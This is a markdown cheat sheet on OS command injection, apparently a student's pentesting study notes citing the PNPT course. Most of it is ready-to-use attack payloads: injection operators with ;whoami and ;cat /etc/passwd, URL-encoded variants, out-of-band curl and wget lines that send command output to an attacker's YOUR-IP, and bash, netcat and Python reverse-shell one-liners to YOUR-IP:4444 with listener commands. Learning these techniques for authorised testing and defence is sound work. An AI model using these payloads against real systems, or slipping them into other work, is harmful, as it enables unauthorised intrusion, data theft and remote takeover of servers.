# COMMAND INJECTION

## Core Concept
OS commands are injected into shell calls via unsanitized input.
Common in web apps that execute OS commands (ping, DNS lookup, file operations).

## Injection Operators

| Operator | Behavior | Example |
|----------|----------|---------|
| `;` | Second command always executes | `ping 8.8.8.8;whoami` |
| `&&` | Second only if first succeeds | `ping 8.8.8.8&&whoami` |
| `\|\|` | Second only if first fails | `nothing\|\|whoami` |
| `\|` | Output of first is piped to second | `ping 8.8.8.8\|whoami` |

## Basic Payloads

```
;whoami
;id
;ls
;cat /etc/passwd
;whoami;echo -
```

URL-encoding (if needed):
```
%3Bwhoami        → ;whoami
%26%26whoami     → &&whoami
%7Cwhoami        → |whoami
```

## Example (from PNPT course)
```
https://tcm-sec.com;whoami;echo HTTP/
;whoami;asd
```

## Blind / Out-of-Band

When no output is visible (no error, no output in the response):

### Time-based
```bash
;sleep 5;          → 5 sec delay = vulnerable
```

### DNS/HTTP-based
```bash
# Own listener
$ nc -nvlp 80
$ python3 -m http.server 80

# Payloads
;curl http://YOUR-IP:80/$(whoami);
;wget http://YOUR-IP/$(id);

# DNS-based (Burp Collaborator / interactsh)
;nslookup YOUR-SUBDOMAIN.burpcollaborator.net;
```

## Reverse Shell via Command Injection

```bash
;bash -i >& /dev/tcp/YOUR-IP/4444 0>&1;
;nc -e /bin/bash YOUR-IP 4444;
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])';
```

Listener:
```bash
$ nc -nvlp 4444
```

## Burp Suite Workflow
1. Intercept request with OS command input (e.g. ping function)
2. Send to **Repeater**
3. Append operators: `;whoami`, `|id`, `&&cat /etc/passwd`
4. Check response for command output
5. No output → blind techniques: time-based or OOB

## Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings (→ Command Injection)
- https://portswigger.net/web-security/os-command-injection
